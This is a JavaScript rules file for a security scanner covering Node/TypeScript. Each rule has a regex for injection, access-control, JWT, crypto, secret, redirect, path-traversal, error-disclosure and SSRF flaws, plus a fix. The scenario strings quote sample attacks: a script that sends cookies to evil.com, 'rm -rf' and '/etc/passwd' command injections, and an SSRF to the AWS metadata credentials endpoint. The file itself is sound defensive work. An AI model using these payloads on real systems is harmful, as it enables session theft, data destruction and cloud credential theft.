/**
 * rules-js.js
 * Security rules for JavaScript / Node.js / TypeScript.
 *
 * Each rule:
 *   id, name, severity, category, why, scenario, fix
 *   pattern        – RegExp used for matching
 *   antipattern    – Optional RegExp: if match found within LOOKAHEAD chars → skip (reduces false positives)
 *   lookahead      – How many chars after match to check antipattern (default 300)
 *   fileTypes      – File extensions this rule applies to
 */

const LOOKAHEAD_DEFAULT = 300;

// ── Known auth middleware identifiers ─────────────────────────────────────
// Used in AUTH-001 to detect presence of middleware in route definitions
const AUTH_MIDDLEWARE = /requireAuth|isAuthenticated|authenticate|verifyToken|checkAuth|isLoggedIn|authMiddleware|jwtMiddleware|verifyJWT|ensureAuth|protect|authorize|isAdmin|hasRole|validateToken|passport.authenticate/;

const INJECTION_RULES = [
  {
    id: 'INJ-001',
    name: 'SQL Injection – string concatenation',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    pattern: /(?:query|sql)\s*[=+]\s*[`'"]\s*SELECT[\s\S]{0,80}\$\{|(?:query|sql)\s*[=+]\s*[`'"]\s*SELECT[\s\S]{0,80}\+\s*\w/gi,
    why: 'User input is concatenated directly into the SQL query without sanitisation.',
    scenario: "An attacker enters ' OR '1'='1 in an input field and gains access to the entire database. Can also delete data or take over the server.",
    fix: 'Always use parameterised queries: db.query("SELECT * FROM users WHERE id = ?", [id])',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'INJ-002',
    name: 'XSS – unsanitised innerHTML',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    pattern: /\.innerHTML\s*=\s*(?!['"`]\s*['"`])[^;]{0,120}(?:req\.|request\.|params\.|query\.|body\.|\$_GET|\$_POST|location\.|search\b|hash\b)/g,
    why: 'User data is rendered directly as HTML without escaping.',
    scenario: 'An attacker injects <script>document.location="https://evil.com?c="+document.cookie</script> and steals session cookies from all visitors.',
    fix: 'Use textContent instead of innerHTML, or sanitise with DOMPurify before assignment.',
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx'],
  },
  {
    id: 'INJ-003',
    name: 'Command Injection – shell-exekvering med user input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // exec/execSync/spawn with template literal or concatenation containing user input
    pattern: /(?:exec|execSync|spawn|spawnSync|execFile)\s*\(\s*(?:[`'"][^`'"]*\$\{(?:req|request|params|query|body|input|cmd|command)[^}]*\}|[`'"]\s*\+\s*(?:req|request|params|query|body))/g,
    why: 'Shell commands are built with unvalidated user input and executed directly on the server.',
    scenario: 'An attacker sends "; rm -rf /var/www" as input. The server executes it as a shell command with the application\'s privileges.',
    fix: 'Avoid exec with user input. Use parameterised alternatives (child_process.execFile) or whitelist allowed values.',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    // INJ-001b: taintAware — catches assign-then-use SQL injection
    // e.g.: const id = req.query.id; const sql = "SELECT..." + id;
    id: 'INJ-001',
    name: 'SQL Injection – tainted variable in query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    taintAware: true,
    taintExtract: 'concat',
    // Matches SQL variable/string being built with concatenation or template literal
    pattern: /(?:const|let|var)?\s*(?:sql|query|qry|SQL|stmt)\s*[=+]=?\s*[`'"][^`'"]{0,200}(?:SELECT|INSERT|UPDATE|DELETE)[^`'"]{0,200}[`'"]\s*[+\n]|(?:db|pool|conn|client|knex|sequelize)\s*\.\s*(?:query|execute|raw)\s*\(\s*[^\n'"]{0,200}/gi,
    antipattern: /\?\s*[,\])]|prepare\s*\(|parameterized|$\d+|\bplaceholder/i,
    why: 'A variable assigned from req.query/req.body is concatenated into a SQL query without parameterisation.',
    scenario: 'const id = req.query.id; db.query("SELECT * FROM users WHERE id = " + id) — attacker sends ?id=1 OR 1=1.',
    fix: 'Use parameterised queries: db.query("SELECT * FROM users WHERE id = ?", [id])',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    // INJ-002b: taintAware — catches assign-then-use XSS via innerHTML
    // e.g.: const name = req.query.name; element.innerHTML = name;
    id: 'INJ-002',
    name: 'XSS – tainted variable assigned to innerHTML',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    taintAware: true,
    taintExtract: 'concat',
    pattern: /\.innerHTML\s*=\s*[^\n;]{0,200}/g,
    antipattern: /DOMPurify|sanitize|escapeHtml|textContent\s*=|innerText\s*=/,
    why: 'A variable assigned from user input is rendered as HTML without escaping.',
    scenario: 'const name = req.query.name; el.innerHTML = name — attacker injects <script> tags.',
    fix: 'Use textContent instead of innerHTML, or sanitise with DOMPurify.sanitize() before assignment.',
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx'],
  },
  {
    // INJ-003b: taintAware — catches assign-then-use command injection
    // e.g.: const cmd = req.query.cmd; exec(cmd);
    id: 'INJ-003',
    name: 'Command Injection – tainted variable in shell command',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    taintAware: true,
    taintExtract: 'concat',  // handles + concat and ${} template literals
    pattern: /(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(\s*[^\n]{0,200}/g,
    antipattern: /execFile\s*\(\s*['"]\w|shell\s*:\s*false|\bshellEscape\b/i,
    why: 'A variable assigned from req.query/req.body is passed to a shell command without sanitisation.',
    scenario: 'const cmd = req.query.cmd; exec(cmd) — attacker sends ?cmd=; cat /etc/passwd.',
    fix: 'Never pass user input to exec(). Use execFile() with an array of arguments, never a shell string.',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'INJ-004',
    name: 'Unparameterized query – dynamic string construction',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    // Matches db.query()/pool.query()/knex.raw() etc. where the query string
    // is built with concatenation or template literals containing a variable.
    // Safe patterns (parameterised with ? or $N) are excluded by antipattern.
    //
    // Matches:
    //   db.query("SELECT ... " + id)
    //   db.query(`SELECT ... ${id}`)
    //   knex.raw(`SELECT ... ${table}`)
    //   pool.query("SELECT ..." + val)
    //
    // Does NOT match:
    //   db.query("SELECT ... ?", [id])        ← parameterised
    //   db.query("SELECT ... $1", [id])        ← parameterised
    // Matches db.query()/pool.query()/knex.raw() etc. where query is built dynamically.
    // Excludes (inline via negative lookahead):
    //   - Safe parameterised calls: query("...", [val]) or query("...", (val))
    pattern: /(?:db|pool|conn|client|connection|knex|sequelize|pgClient|mysql)\s*\.\s*(?:query|execute|raw)\s*\((?!\s*['"`][^'"`]*['"`]\s*,\s*[(\[])(?:[^)]{0,400})(?:\$\{[^}]{1,60}\}|['"]\s*\+\s*\w|\w\s*\+\s*['"`])/gi,
    why: 'The SQL query is constructed with string concatenation or a template literal. Even if current values appear safe, this pattern invites SQL injection as the codebase grows.',
    scenario: 'A developer adds a new dynamic value later using the same pattern — one unescaped value exposes the entire query.',
    fix: 'Use parameterised queries: db.query("SELECT * FROM t WHERE id = ?", [id]) — never interpolate variables into query strings.',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
];

const AUTH_RULES = [
  {
    id: 'AUTH-001',
    name: 'Route utan authentications-middleware',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    // BAD:  router.get("/path", async (req =>  ← async is 2nd arg, no middleware
    // GOOD: router.get("/path", authFn, async (req =>  ← middleware present
    pattern: /(?:app|router)\.(?:get|post|put|delete|patch)\s*\(\s*['"`][^'"`)]+['"`]\s*,\s*async\s*\(/g,
    antipattern: null,
    lookahead: 0,
    why: 'Route is missing visible authentication middleware — data may be accessible without logging in.',
    scenario: 'Anyone can call the endpoint directly without being logged in and access data that should be protected.',
    fix: 'Add auth middleware as the second argument: router.get("/data", requireAuth, async (req, res) => { ... })',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'AUTH-002',
    name: 'IDOR – object fetched without ownership check',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:findById|findOne|findByPk|getById)\s*\(\s*req\.(?:params|query|body)\.\w+\s*\)/g,
    // If ownership check appears within lookahead → likely safe
    antipattern: /(?:userId|ownerId|createdBy|user\.id|req\.user)\s*[:=]/,
    lookahead: 200,
    why: 'Objects are fetched directly with an ID from the URL/body without verifying that the user owns them.',
    scenario: 'A user with order ID 42 can change the URL to /api/orders/99 and view another customer\'s order. Known as Insecure Direct Object Reference (IDOR).',
    fix: 'Always add an ownership check: db.findOne({ _id: id, userId: req.user.id })',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'AUTH-003',
    name: 'Mass assignment – okontrollerad req.body',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:create|update|save|insert)\s*\(\s*req\.body\s*\)/g,
    why: 'Hela req.body skickas direkt till database-operationen utan whitelist-filtrering.',
    scenario: 'An attacker adds isAdmin: true to their POST request and gains administrator privileges if the field exists in the database.',
    fix: 'Destructure and whitelist specific fields: const { name, email } = req.body; User.create({ name, email })',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'AUTH-004',
    name: 'Password in URL-encoded string – risk of GET exposure',
    severity: 'MEDIUM',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matchar: "username="+user+"&password="+pwd  eller  `password=${pwd}&`
    // Common pattern when the frontend builds query strings manually for AJAX
    // Kan vara acceptabelt om det skickas som POST-body, men riskabelt om
    // it is used as a URL parameter (GET) — and it often isn't visible on the same line.
    pattern: /['"&]password=["']\s*\+\s*\w+|`[^`]*password=\$\{/gi,
    antipattern: /type\s*[:=]\s*['"]GET['"]/i,
    lookahead: 400,
    why: 'A URL-encoded string containing password= risks ending up as a GET parameter in the URL, exposing the password in server logs, browser history and Referer headers. Even with POST, passwords should be sent as a JSON body or FormData, never as a query string.',
    scenario: 'If $.ajax({url: endpoint + "?" + postdata}) is used instead of POST, the password appears in the URL and is visible in Apache/nginx logs: "GET /login.php?username=admin&password=secret123 HTTP/1.1"',
    fix: 'Send passwords as JSON via fetch/axios: fetch(url, { method: "POST", body: JSON.stringify({ username, password }) }) — never as a query string.',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
];

const JWT_RULES = [
  {
    id: 'JWT-001',
    name: 'JWT verifieras inte – decode utan verify',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /jwt\.decode\s*\([^)]+\)/g,
    antipattern: /jwt\.verify/,
    lookahead: 500,
    why: 'jwt.decode() kontrollerar inte signaturen – vem som helst kan skapa en arbitrary token.',
    scenario: 'An attacker creates a JWT with payload {"role":"admin"} without knowing the secret. Without signature verification it is accepted as valid.',
    fix: 'Always use jwt.verify(token, secret) instead of jwt.decode(token).',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
  {
    id: 'JWT-002',
    name: 'JWT lagras i localStorage',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /localStorage\.setItem\s*\(\s*['"`][^'"`)]*(?:token|jwt|auth)[^'"`)]*['"`]/gi,
    why: 'localStorage is accessible via JavaScript and vulnerable to XSS attacks.',
    scenario: 'If an XSS vulnerability exists, an attacker can read localStorage and steal all tokens. HttpOnly cookies are not accessible via JavaScript.',
    fix: 'Store tokens in httpOnly, Secure cookies instead of localStorage.',
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx'],
  },
];

const CRYPTO_RULES = [
  {
    id: 'CRYPTO-001',
    name: 'Weak password hashing algorithm (MD5/SHA1)',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /(?:crypto\.createHash\s*\(\s*['"`](?:md5|sha1)['"`]|require\s*\(\s*['"`]md5['"`]\s*\))/gi,
    why: 'MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.',
    scenario: 'An attacker who steals your database can crack MD5-hashed passwords using rainbow tables in minutes. Millions of passwords are already pre-hashed online.',
    fix: 'Use bcrypt, argon2 or scrypt for passwords: const hash = await bcrypt.hash(password, 12)',
    fileTypes: ['js', 'ts', 'mjs', 'cjs'],
  },
];

// ── EXPOSURE rules (public keys requiring service-side configuration) ──────
const EXPOSURE_RULES = [
  {
    id: 'FRONT-001',
    name: 'Mapbox publik token i frontend',
    severity: 'EXPOSURE',
    category: 'Frontend Exposure',
    service: 'Mapbox',
    pattern: /['"`]pk\.eyJ[a-zA-Z0-9._-]{20,}['"`]/g,
    why: 'Mapbox public tokens are intended for frontend use but require active domain restriction to be safe.',
    scenario: 'Without domain restriction anyone can use your token for map requests at your expense.',
    checklist: [
      'Domain restriction enabled in Mapbox Account → Tokens',
      'Scope limited to required services only',
      'Usage limits (rate limits) configured',
      'Rotation-plan dokumenterad om token missbrukas',
    ],
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx', 'html'],
  },
  {
    id: 'FRONT-002',
    name: 'Google Maps API-key i frontend',
    severity: 'EXPOSURE',
    category: 'Frontend Exposure',
    service: 'Google Maps',
    pattern: /['"`]AIza[0-9A-Za-z_-]{35}['"`]/g,
    why: 'Google Maps API keys in frontend code are visible to everyone. Google recommends HTTP referrer restrictions.',
    scenario: 'Unrestricted Google Maps keys can be abused and result in unexpected costs. Cases involving thousands of dollars in unintended charges are well documented.',
    checklist: [
      'HTTP referrer-restriktion aktiverad i Google Cloud Console',
      'API restriction – only Maps JavaScript API enabled for this key',
      'Faktureringsvarningar konfigurerade i Google Cloud',
      'Separate key for production vs. development',
    ],
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx', 'html'],
  },
  {
    id: 'FRONT-003',
    name: 'Stripe publishable key i frontend',
    severity: 'EXPOSURE',
    category: 'Frontend Exposure',
    service: 'Stripe',
    pattern: /['"`]pk_live_[a-zA-Z0-9]{24,}['"`]/g,
    why: 'Stripe\'s publishable key is public by design but its exposure should be documented and Radar rules should be active.',
    scenario: 'A publishable key can be used to create payment forms in your name for social engineering attacks.',
    checklist: [
      'Confirmed this is the publishable key (pk_live_) — NOT the secret key (sk_live_)',
      'Stripe Radar rules configured to flag unusual activity',
      'Webhook verification enabled for all incoming events',
    ],
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx'],
  },
  {
    id: 'FRONT-004',
    name: 'Firebase configuration i frontend',
    severity: 'EXPOSURE',
    category: 'Frontend Exposure',
    service: 'Firebase',
    pattern: /apiKey\s*:\s*['"`][A-Za-z0-9_-]{35,}['"`]/g,
    why: 'Firebase config in the frontend requires correctly configured Security Rules — otherwise the database is open.',
    scenario: 'Without strict Security Rules anyone with your Firebase config can read or write to your database.',
    checklist: [
      'Firebase Security Rules granskade och testade',
      'Authentication enabled — no anonymous write operations permitted',
      'App Check enabled to verify that requests originate from your app',
    ],
    fileTypes: ['js', 'ts', 'mjs', 'jsx', 'tsx'],
  },
  {
    id: 'FRONT-005',
    name: 'Source map exposed in production',
    severity: 'EXPOSURE',
    category: 'Frontend Exposure',
    service: 'Build pipeline',
    pattern: /\/\/[#@]\s*sourceMappingURL\s*=\s*(?!data:)[^\s]+\.map/g,
    why: 'Source map files (.map) should never be served in production, regardless of whether they map your own code or third-party libraries. Their presence indicates that the build pipeline is not stripping source maps before deployment — which means your own bundled source code is very likely exposed as well. For your own code this means unobfuscated business logic, internal API routes, and variable names are readable by anyone with browser DevTools.',
    scenario: 'An attacker opens DevTools, finds the sourceMappingURL reference, and downloads the .map file directly. They can now read the original unminified source of your application — including any code you believed was protected by minification or obfuscation.',
    checklist: [
      'Source maps are NOT generated in the production build (check webpack/vite/rollup config)',
      'If source maps are needed for error tracking — use a private source map server (e.g. Sentry) that never serves .map files publicly',
      'Verify that .map files are blocked by the web server / CDN in production',
      'Check that your CI/CD pipeline does not deploy the /dist folder including .map files',
    ],
    fileTypes: ['js', 'ts', 'mjs'],
  },
];

module.exports = {
  INJECTION_RULES,
  AUTH_RULES,
  JWT_RULES,
  CRYPTO_RULES,
  EXPOSURE_RULES,
  ALL_RULES: [...INJECTION_RULES, ...AUTH_RULES, ...JWT_RULES, ...CRYPTO_RULES],
  ALL_EXPOSURE_RULES: EXPOSURE_RULES,
  LOOKAHEAD_DEFAULT,
};

// ── Secrets ───────────────────────────────────────────────────────────────────

const SECRET_RULES = [
  {
    id: 'JS-SECRET-001',
    name: 'Hardcoded API key or secret in source code',
    severity: 'CRITICAL',
    category: 'Security Misconfiguration (OWASP A05)',
    pattern: /(?:api[_-]?key|api[_-]?secret|app[_-]?secret|client[_-]?secret|access[_-]?token|auth[_-]?token|bearer[_-]?token|private[_-]?key)\s*[:=]\s*['"`][a-zA-Z0-9\-_\/+]{16,}['"`]/gi,
    antipattern: /process\.env|config\.|getenv|os\.environ|\$\{|\btest\b|\bmock\b|\bexample\b|\bplaceholder\b/i,
    lookahead: 60,
    why: 'Hardcoded secrets are exposed to everyone with repository access — current and former employees, CI systems, forks, and anyone who finds the repo public or leaked. Secret scanning tools and threat actors routinely harvest these.',
    scenario: 'Developer hardcodes const API_SECRET = "sk-prod-abc123..." during local testing. It ships in a commit, the repo becomes public six months later, the secret is harvested within hours by automated scanners.',
    fix: 'const apiSecret = process.env.API_SECRET. Store secrets in .env (git-ignored) locally, and in environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) in production.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
  {
    id: 'JS-SECRET-002',
    name: 'Hardcoded JWT secret or encryption key',
    severity: 'CRITICAL',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matches: jwt.sign(payload, "hardcoded"), jwt.verify(token, "hardcoded")
    // Also: createHmac('sha256', 'hardcoded'), createCipheriv(alg, 'hardcoded', iv)
    pattern: /(?:jwt\.sign|jwt\.verify|createHmac|createCipheriv|createDecipheriv)\s*\([^)]{0,200},[^)]{0,100}['"`][a-zA-Z0-9\-_\/+]{8,}['"`]/g,
    antipattern: /process\.env|config\./i,
    lookahead: 40,
    why: 'A hardcoded JWT secret means all tokens can be forged by anyone who reads the source code. A hardcoded encryption key means all encrypted data can be decrypted. Both are permanent — rotating requires a code deploy.',
    scenario: 'jwt.sign(payload, "mysecretkey") is in source. Attacker reads the key from GitHub, signs arbitrary payloads, and impersonates any user. The only fix is invalidating all existing tokens and redeploying.',
    fix: 'const secret = process.env.JWT_SECRET. Generate with: node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))". Minimum 256 bits for HMAC-SHA256.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

// ── Open redirect ─────────────────────────────────────────────────────────────

const REDIRECT_RULES = [
  {
    id: 'JS-REDIRECT-001',
    name: 'Open redirect — unvalidated URL from request used in redirect',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // res.redirect(req.query.x), res.redirect(req.body.x), res.redirect(req.params.x)
    pattern: /res\s*\.\s*redirect\s*\(\s*req\s*\.\s*(?:query|body|params)\s*(?:\.\s*\w+|\[['"][^'"]+['"]\])/g,
    why: 'Redirecting to an attacker-controlled URL enables phishing — users see a legitimate domain in the link (yourapp.com/login?returnUrl=evil.com) and are redirected to a malicious site after clicking.',
    scenario: 'Login flow: res.redirect(req.query.returnUrl). Attacker sends users a link to yourapp.com/login?returnUrl=https://evil.com/fake-login. After authenticating, users land on the phishing page and re-enter credentials.',
    fix: 'Validate the redirect target: const allowed = ["/dashboard", "/profile"]; const target = req.query.returnUrl; res.redirect(allowed.includes(target) ? target : "/"). Only allow relative paths or explicitly allowlisted URLs.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

// ── Path traversal ────────────────────────────────────────────────────────────

const PATH_RULES = [
  {
    id: 'JS-PATH-001',
    name: 'Path traversal — user input used directly in file system operation',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    // fs.readFile(req.x), fs.readFileSync(req.x), fs.writeFile(req.x)
    // path.join(__dirname, req.x) — path.join does NOT prevent traversal with absolute segments
    pattern: /fs\s*\.\s*(?:readFile|readFileSync|writeFile|writeFileSync|appendFile|unlink|stat|access)\s*\(\s*(?:req\s*\.\s*(?:query|body|params)|path\s*\.\s*(?:join|resolve)\s*\([^)]{0,100}req)/g,
    why: 'Using request input directly in file system calls allows directory traversal. path.join() does not sanitize — path.join("/uploads", "../../etc/passwd") resolves to /etc/passwd. An attacker can read any file the process has access to.',
    scenario: 'GET /file?name=report.pdf becomes fs.readFile(path.join(__dirname, req.query.name)). Attacker requests ?name=../../etc/passwd and receives the server\'s password file.',
    fix: 'Resolve and validate: const base = path.resolve("/safe/uploads"); const target = path.resolve(base, req.query.name); if (!target.startsWith(base)) return res.status(403).send("Forbidden"); fs.readFile(target, ...)',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

module.exports.SECRET_RULES = SECRET_RULES;
module.exports.REDIRECT_RULES = REDIRECT_RULES;
module.exports.PATH_RULES = PATH_RULES;
module.exports.ALL_RULES = [...module.exports.ALL_RULES, ...SECRET_RULES, ...REDIRECT_RULES, ...PATH_RULES];

// ── Crypto additions (P2) ───────────────────────────────────────────────────

const CRYPTO_EXTRA_RULES = [
  {
    id: 'JS-CRYPTO-002',
    name: 'Weak random number generator used for security-sensitive value',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    // Math.random() used to generate tokens, IDs, passwords, CSRF values, OTPs, salts
    pattern: /Math\.random\s*\(\s*\)[\s\S]{0,120}(?:token|secret|password|csrf|nonce|salt|otp|code|key|session|id)\b|\b(?:token|secret|password|csrf|nonce|salt|otp|code|key|session)\b[\s\S]{0,120}Math\.random\s*\(\s*\)/gi,
    why: 'Math.random() is a pseudo-random number generator (PRNG) — not a cryptographically secure RNG. Its output is predictable given enough observed values. Using it to generate tokens, passwords, or CSRF values means an attacker who observes some outputs can predict future ones.',
    scenario: 'const resetToken = Math.random().toString(36).slice(2) used as a password-reset token. An attacker who can trigger multiple resets and observe a few tokens can statistically predict the next one and take over any account.',
    fix: 'Use the built-in crypto module: const token = require("crypto").randomBytes(32).toString("hex"). For shorter codes: crypto.randomInt(100000, 999999). These use the OS CSPRNG and are not predictable.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
  {
    id: 'JS-CRYPTO-003',
    name: 'Hardcoded encryption key or IV in crypto operation',
    severity: 'CRITICAL',
    category: 'Cryptographic Failures (OWASP A02)',
    // createCipheriv / createDecipheriv with hardcoded string key or IV
    // e.g. createCipheriv('aes-256-cbc', 'hardcodedkey1234', 'hardcodediv12345')
    pattern: /(?:createCipheriv|createDecipheriv)\s*\([^)]{0,300}['"`][a-zA-Z0-9+\/=\-_]{8,}['"`]\s*,\s*['"`][a-zA-Z0-9+\/=\-_]{8,}['"`]/g,
    antipattern: /process\.env|config\./i,
    lookahead: 60,
    why: 'Hardcoding the encryption key and IV means all encrypted data uses the same key, which is visible to anyone with source access. A static IV also makes the encryption deterministic — identical plaintexts produce identical ciphertexts, leaking patterns.',
    scenario: 'createCipheriv("aes-256-cbc", "mysecretkey12345", "myiv123456789012") in source. Attacker reads key and IV, decrypts all stored data. The IV is also reused for every encryption, enabling ciphertext comparison attacks.',
    fix: 'Key: const key = Buffer.from(process.env.ENCRYPTION_KEY, "hex") — generate with crypto.randomBytes(32). IV: generate fresh for every encryption: const iv = crypto.randomBytes(16). Store the IV alongside the ciphertext (it is not secret).',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

// ── Error / info disclosure (P2) ──────────────────────────────────────────────

const ERROR_RULES = [
  {
    id: 'JS-ERR-001',
    name: 'Exception details or stack trace exposed to client in error response',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // res.json(err), res.send(err), res.json({ error: err }), res.json({ message: err.message, stack: err.stack })
    pattern: /res\s*\.\s*(?:json|send)\s*\(\s*(?:err|error|e|ex)\s*[),]|res\s*\.\s*status\s*\([^)]+\)\s*\.\s*(?:json|send)\s*\(\s*(?:err|error|e|ex)\s*[),]|res\s*\.\s*(?:json|send|status\s*\([^)]+\)\s*\.(?:json|send))\s*\([^)]{0,200}(?:\.stack\b|error\.message[^)]{0,100}stack)/gs,
    why: 'Returning raw error objects or stack traces to the client reveals internal file paths, library versions, databasee schema details, and application logic. This information directly assists attackers in crafting targeted exploits.',
    scenario: 'catch (err) { res.json(err) } — the response includes stack: "at /home/app/src/db/users.js:47:12", message: "relation \\"users_v2\\" does not exist". Attacker now knows the internal path structure and exact table names.',
    fix: 'Log the full error server-side; return a generic message to the client: catch (err) { logger.error(err); res.status(500).json({ error: "Internal server error" }) }. Use a centralized error handler in Express: app.use((err, req, res, next) => { ... })',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
  {
    id: 'JS-ERR-002',
    name: 'Sensitive request data logged to console',
    severity: 'MEDIUM',
    category: 'Security Misconfiguration (OWASP A05)',
    // console.log(req.body), console.log(req.headers), console.log(password), console.log(token)
    pattern: /console\s*\.\s*(?:log|error|warn|info|debug)\s*\([^)]{0,200}(?:req\s*\.\s*(?:body|headers|cookies)|password|token|secret|authorization|api.?key)/gi,
    why: 'Logging request bodies, auth headers, or sensitive fields sends credentials and tokens to stdout/stderr — which in production environments are typically collected by log aggregation systems, visible to all developers with log access, and often retained for months.',
    scenario: 'console.log("Login attempt:", req.body) logs { username: "admin", password: "hunter2" } to production logs. Every developer, DevOps engineer, and log-monitoring tool now has the plaintext password.',
    fix: 'Log only what you need, and sanitize: const safe = { ...req.body }; delete safe.password; delete safe.token; logger.info("Login attempt", safe). Use a structured logger (pino, winston) with log levels — never log raw request bodies in production.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

module.exports.CRYPTO_EXTRA_RULES = CRYPTO_EXTRA_RULES;
module.exports.ERROR_RULES        = ERROR_RULES;
module.exports.ALL_RULES          = [...module.exports.ALL_RULES, ...CRYPTO_EXTRA_RULES, ...ERROR_RULES];

// ── SSRF (P3) ─────────────────────────────────────────────────────────────────

const SSRF_RULES = [
  {
    id: 'JS-SSRF-001',
    name: 'SSRF — user-controlled URL passed to fetch, axios or http request',
    severity: 'HIGH',
    category: 'Server-Side Request Forgery (OWASP A10)',
    // fetch(req.query.url), axios.get(req.body.url), http.get(req.params.endpoint)
    pattern: /(?:fetch|axios\s*\.\s*(?:get|post|put|delete|request)|https?\s*\.\s*(?:get|request))\s*\(\s*(?:req\s*\.\s*(?:query|body|params)|[^,)]{0,60}req\s*\.\s*(?:query|body|params))/g,
    why: 'Passing user-supplied URLs to outbound HTTP requests allows attackers to make the server send requests to internal infrastructure — cloud metadata endpoints (169.254.169.254), internal databasees, admin panels, or other services not exposed to the internet.',
    scenario: 'fetch(req.query.url) to proxy an image. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS IAM credentials. Attacker now has full cloud access.',
    fix: 'Validate and restrict: parse the URL, check scheme (https only), resolve hostname and verify it is not a private/loopback range. Use an allowlist of permitted domains: const ALLOWED = ["api.example.com"]; if (!ALLOWED.includes(parsed.hostname)) return res.status(403). Never pass raw user input as a URL.',
    fileTypes: ['js', 'mjs', 'cjs', 'ts', 'tsx'],
  },
];

module.exports.SSRF_RULES = SSRF_RULES;
module.exports.ALL_RULES  = [...module.exports.ALL_RULES, ...SSRF_RULES];
